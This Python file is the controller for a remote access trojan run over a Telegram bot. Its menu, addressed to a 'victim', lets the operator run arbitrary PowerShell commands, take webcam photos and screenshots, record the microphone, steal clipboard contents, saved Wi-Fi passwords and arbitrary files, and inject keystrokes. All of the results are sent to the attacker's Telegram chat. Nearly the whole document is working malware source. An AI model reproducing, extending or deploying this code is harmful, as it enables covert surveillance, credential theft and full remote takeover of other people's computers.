
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
import telegram
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import flag
import pyperclip
import subprocess
import sys
import getpass
import requests
import config as cfg
from Modules import (
    ip_info,
    webcam_snap,
    screen_shot,
    audio_recorder,
    text_speaker,
    system_info,
    move_mouse,
    get_wifi_password,
    chat,
    show_popup,
    send_key_press,
    wifi_scanner,
    open_website,
    file_mgmt
)



api_key = cfg.apiKey
chat_id = cfg.chatID

username = getpass.getuser()

application = ApplicationBuilder().token(api_key).build()




def listToString(s):
    str1 = " "
    return str1.join(s)


async def main_menu(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
        [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
        [InlineKeyboardButton("👂 Eavesdrop", callback_data="eavesdrop")],
        [InlineKeyboardButton("🗣️ Text To Speech on victim", callback_data="speak")],
        [InlineKeyboardButton("💬 Send Message To Client", callback_data="sendMessage")],
        [
            InlineKeyboardButton(
                "🖥️ Get System Information", callback_data="get_system_info"
            )
        ],
        [
            InlineKeyboardButton(
                "🔑 Perform Shell Commands", callback_data="shell_commands"
            )
        ],
        [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
        [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
        [
            InlineKeyboardButton(
                "🖲️ Move mouse randomly and Slowly", callback_data="move_mouse"
            )
        ],
        [InlineKeyboardButton("⌨️ Type String", callback_data="type_stringKey")],
        [
            InlineKeyboardButton(
                "⚠️ Show Alert Box with given message", callback_data="show_popup"
            )
        ],
        [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
        [
            InlineKeyboardButton(
                "🗝️ Get Wifi Password", callback_data="get_wifi_password"
            )
        ],
        [
            InlineKeyboardButton(
                "📶 Get Wi-Fi Access Points", callback_data="get_wifi_accesspoints"
            )
        ],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = await update.message.reply_text("Please choose:", reply_markup=reply_markup)
    await application.bot.pin_chat_message(
    chat_id=msg.chat_id, message_id=msg.message_id
)

def speak(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    text_speaker.text_speaker(Crt_values)

async def cd_dot(update, context):
    await application.bot.send_message(
            chat_id=chat_id, text="Directory Changed To: " + file_mgmt.dir_dot()
        )
    
async def cd_dir(update, context):
    inputs = (update.message.text).split()
    dir = listToString(inputs[1:])
    

    await application.bot.send_message(
            chat_id=chat_id, text=file_mgmt.dir_path(dir)
        )
    
async def file_ls(update, context):
    inputs = (update.message.text).split()
    dir = listToString(inputs[1:])
   
    await application.bot.send_message(
            chat_id=chat_id, text=file_mgmt.dir_ls(dir)
        )


async def chat_message(update, context):
    inputs = (update.message.text).split()
    Crt_values = inputs[1:]
    client_message = chat.chat(listToString(Crt_values))
    if client_message:
        await update.message.reply_text(f"Message from {username} : {client_message}")
    else:
        await update.message.reply_text(f"No message from {username}")

async def listen(update: Update, context):
    inputs = (update.message.text).split()

    sec = inputs[1] 
    did = inputs[2] 
    ch = inputs[3] 
    rt = inputs[4]
    try:
        audio_recorder.audio_recorder(int(sec), int(did), int(ch), int(rt))
    except ValueError:
        await application.bot.send_message(
        chat_id=chat_id, text="The args must be INT: for example:\n❌ 48000.0\n✅48000")
        return
    await application.bot.send_audio(
                chat_id=chat_id,
                caption=username + "'s Audio",
                audio=open("audio_record.wav", "rb"),
            )
    os.remove("audio_record.wav")
async def showPopup(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])

    show_popup.show_popup(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="The pop up was shown"
        )

async def type_string(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    send_key_press.send_key_press(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="The string has been written"
        )

async def shell_commands(update, context):
    inputs = (update.message.text).split()
    command = listToString(inputs[1:])
    cmd_output = subprocess.Popen(
        f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE
    )
    try:
        await application.bot.send_message(
            chat_id=chat_id, text=cmd_output.stdout.read().decode(sys.stdout.encoding)
        )
    except telegram.error.BadRequest:
        await application.bot.send_message(
            chat_id=chat_id, text="No output"
        )


async def open_websites(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    open_website.open_website(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="Website opened"
        )

async def get_file(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    await application.bot.send_document(chat_id=chat_id, document=open(Crt_values, "rb"))


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    result = query.data
    
    if result == "get_Webcam":

        if not webcam_snap.webcam_snap() == "Error":
            await application.bot.send_document(
                chat_id=chat_id,
                caption=username + "'s Webcam Snap",
                document=open("webcam.jpg", "rb"),
            )
            os.remove("webcam.jpg")
        else:
            await application.bot.send_message(
            chat_id=chat_id,
            text="I couldn't open a webcam",
        )

    elif result == "get_system_info":
        sys_info = system_info.system_info()
        await application.bot.send_message(
            chat_id=chat_id,
            text=f"<b>-------🧰 Hardware Info-----</b>\n\n"
            f"📍 System --> {sys_info.get_system()}\n"
            f"📍 Name --> {sys_info.get_system_name()}\n"
            f"📍 Release --> {sys_info.get_system_release()}\n"
            f"📍 Version --> {sys_info.get_system_version()}\n"
            f"📍 Machine --> {sys_info.get_system_machine()}\n"
            f"📍 Processor --> {sys_info.get_system_processor()}\n\n"
            f"<b>-------📁 Memory Info-----</b>\n\n"
            f"📍 Memory Total --> {round(sys_info.mem_total)} GB\n"
            f"📍 Free Memory --> {round(sys_info.mem_free)} GB\n"
            f"📍 Used Memory --> {round(sys_info.mem_used)} GB\n\n"
            f"-------<b>💿 Hard Disk Info-----</b>\n\n"
            f"📍 Total HDD --> {round(sys_info.HDD_total)} GB\n"
            f"📍 Used HDD --> {round(sys_info.HDD_Used)} GB\n"
            f"📍 Free HDD --> {round(sys_info.HDD_Free)} GB\n",
            parse_mode="HTML"            
        )
    elif result == "Get_IP":
        ip_address_info = ip_info.ip_info()
        await application.bot.send_message(
            chat_id=chat_id,
            text="⭕ <b>IP Address :</b> "
            + ip_address_info["query"]
            + "\n⭕ <b>Country :</b> "
            + ip_address_info["country"]
            + " "
            + flag.flag(ip_address_info["countryCode"])
            + "\n⭕ <b> Region : </b>"
            + ip_address_info["regionName"]
            + "\n⭕ <b>City : </b>"
            + ip_address_info["city"], parse_mode="HTML"
        )
    elif result == "get_Screenshot":
        screen_shot.screen_shot()
        await application.bot.send_photo(
            chat_id=chat_id,
            caption=username + "'s Screenshot",
            photo=open("Screenshot.png", "rb"),
        )
        os.remove("Screenshot.png")

    elif result == "eavesdrop":
        
        await application.bot.send_message(
            chat_id=chat_id,
            text=audio_recorder.print_audio_devices(), parse_mode="HTML"
        )
        await application.bot.send_message(chat_id=chat_id,
            text="\n\nNow run /listen <seconds> <device id> <channels (use max avaible)> <rates (use max avaible)>")


    elif result == "sendMessage":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To send message to victim, use /s_msg <message>",
        )

    elif result == "shell_commands":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To perform shell commands, use /shell <command>",
        )

    elif result == "open_website":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To open website, use /o_web <website>",
        )

    elif result == "move_mouse":
        await application.bot.send_message(
            chat_id=chat_id,
            text="Moving mouse randomly......",
        )
        move_mouse.move_mouse()
        await application.bot.send_message(chat_id=chat_id, text="✅️ Done!")

    elif result == "send_keypress":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To send keypress, use /t_str <string>",
        )

    elif result == "show_popup":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To show alert box, use /s_pop <message>",
        )

    elif result == "get_clipboard":
        await application.bot.send_message(
            chat_id=chat_id, text=f"📋 Clipboard : \n {pyperclip.paste()}"
        )

    elif result == "get_wifi_password":
        wifi_pass = " \n".join(get_wifi_password.get_wifi_password())
        await application.bot.send_message(
            chat_id=chat_id,
            text=wifi_pass,
        )

    elif result == "type_stringKey":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To type string key, use /t_str <string>",
        )

    elif result == "get_wifi_accesspoints":
        access_points = wifi_scanner.wifi_scanner()
        await application.bot.send_message(
            chat_id=chat_id,
            text=access_points
        )

    elif result == "speak":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To speak, use /speak <text>",
        )

    elif result == "get_file":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To send file, use /get_file <file path>",
        )
def send_message(token, chat_id, message):
    
    response = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': chat_id,'text': message}, headers={'Content-Type': 'application/json'})
    
    if response.status_code == 200:
        pass
    else:
        pass
def main():
    send_message(api_key, chat_id, "☠️ " + username + " Connected to " + cfg.rat_name + "\n\n🙊/start")

    application.add_handler(CommandHandler("start", main_menu))

    
    application.add_handler(CommandHandler("s_msg", chat_message))
    application.add_handler(CommandHandler("speak", speak))
    application.add_handler(CommandHandler("s_pop", showPopup))
    application.add_handler(CommandHandler("t_str", type_string))
    application.add_handler(CommandHandler("shell", shell_commands))
    application.add_handler(CommandHandler("o_web", open_websites))
    application.add_handler(CommandHandler("get_file", get_file))
    application.add_handler(CommandHandler("listen", listen))
    application.add_handler(CommandHandler("cd_dot", cd_dot))
    application.add_handler(CommandHandler("cd", cd_dir))
    application.add_handler(CommandHandler("ls", file_ls))

    application.add_handler(CallbackQueryHandler(button))
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)
    


main()